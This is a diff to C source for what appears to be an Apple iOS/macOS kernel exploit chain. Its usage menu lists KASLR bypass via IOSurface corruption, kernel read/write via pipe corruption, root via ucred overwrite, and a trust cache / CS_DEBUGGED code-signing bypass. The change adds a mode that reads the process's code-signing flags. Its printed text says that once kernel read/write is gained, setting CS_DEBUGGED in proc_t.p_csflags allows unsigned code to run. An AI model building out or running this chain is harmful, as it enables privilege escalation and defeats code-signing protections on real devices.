@@ -32,6 +32,7 @@
 #include <mach/mach.h>
 #include <signal.h>
 #include <spawn.h>
+extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
 #include <VideoToolbox/VideoToolbox.h>
 #include <CoreVideo/CoreVideo.h>
 #include <CoreMedia/CoreMedia.h>
@@ -309,9 +310,10 @@ int main(int argc, char *argv[]) {
         p("  kaslr      - Step 1: KASLR bypass via IOSurface corruption\n");
         p("  krw        - Step 2: Kernel R/W via pipe corruption\n");
         p("  root       - Step 3: Root via ucred overwrite\n");
-        p("  codesign   - Step 4: Trust cache injection\n");
+        p("  codesign   - Step 4: Trust cache / CS_DEBUGGED bypass\n");
         p("  chain      - Run all steps in sequence\n");
         p("  status     - Check current privilege level\n");
+        p("  csflags    - Read current process CS flags (needs kernel R/W)\n");
     } else if (strcmp(mode, "kaslr") == 0) {
         step_kaslr_bypass();
     } else if (strcmp(mode, "krw") == 0) {
@@ -333,6 +335,27 @@ int main(int argc, char *argv[]) {
         p("UID: %d\n", getuid());
         p("KASLR slide: 0x%llx\n", (unsigned long long)g_kaslr_slide);
         p("K R/W: %s\n", g_krw_pipe_r >= 0 ? "YES" : "NO");
+    } else if (strcmp(mode, "csflags") == 0) {
+        p("\n=== CS Flags Probe ===\n");
+        p("PID: %d\n", getpid());
+        uint32_t csflags = 0;
+        int ret = csops(getpid(), 0 /* CS_OPS_STATUS */, &csflags, sizeof(csflags));
+        if (ret == 0) {
+            p("CS flags: 0x%08x\n", csflags);
+            p("  CS_VALID:      %s\n", (csflags & 0x00000001) ? "YES" : "no");
+            p("  CS_ADHOC:      %s\n", (csflags & 0x00000002) ? "YES" : "no");
+            p("  CS_GET_TASK_ALLOW: %s\n", (csflags & 0x00000004) ? "YES" : "no");
+            p("  CS_HARD:       %s\n", (csflags & 0x00000100) ? "YES" : "no");
+            p("  CS_KILL:       %s\n", (csflags & 0x00000200) ? "YES" : "no");
+            p("  CS_DEBUGGED:   %s\n", (csflags & 0x10000000) ? "YES" : "no");
+            p("  CS_PLATFORM_BINARY: %s\n", (csflags & 0x04000000) ? "YES" : "no");
+        } else {
+            p("csops failed: %d (%s)\n", errno, strerror(errno));
+        }
+        p("\nThis shows what flags our process currently has.\n");
+        p("After achieving kernel R/W, we can SET CS_DEBUGGED (0x10000000)\n");
+        p("on our proc_t.p_csflags to allow unsigned code execution.\n");
+        p("Critical question: does TXM independently validate?\n");
     } else if (strcmp(mode, "status") == 0) {
         p("UID: %d, GID: %d, PID: %d\n", getuid(), getgid(), getpid());
         p("EUID: %d, EGID: %d\n", geteuid(), getegid());
